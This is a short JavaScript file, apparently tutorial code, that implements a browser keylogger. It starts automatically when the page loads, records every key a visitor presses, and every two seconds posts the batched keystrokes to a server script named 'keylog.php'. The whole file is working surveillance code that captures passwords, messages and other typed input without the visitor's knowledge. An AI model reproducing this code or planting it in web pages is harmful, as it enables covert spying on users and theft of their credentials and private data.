var keylog = {
  // (A) SETTINGS & PROPERTIES
  cache : [], // TEMP STORAGE FOR KEY PRESSES
  delay : 2000, // HOW OFTEN TO SEND DATA TO SERVER
  sending : false, // ONLY 1 UPLOAD ALLOWED AT A TIME

  // (B) INITIALIZE
  init : function () {
    // (B1) CAPTURE KEY STROKES
    window.addEventListener("keydown", function(evt){
      keylog.cache.push(evt.key);
    });
 
    // (B2) SEND KEYSTROKES TO SERVER
    window.setInterval(keylog.send, keylog.delay);
  },

  // (C) AJAX SEND KEYSTROKES
  send : function () { if (!keylog.sending && keylog.cache.length != 0) {
    // (C1) "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
    keylog.sending = true;
 
    // (C2) KEYPRESS DATA
    var data = new FormData();
    data.append("keys", JSON.stringify(keylog.cache));
    keylog.cache = []; // CLEAR KEYS

    // (C3) AJAX SEND
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "keylog.php");
    xhr.onload = function () {
      keylog.sending = false; // UNLOCK
      console.log(this.response); // OPTIONAL
    };
    xhr.send(data);
  }}
};
window.addEventListener("DOMContentLoaded", keylog.init);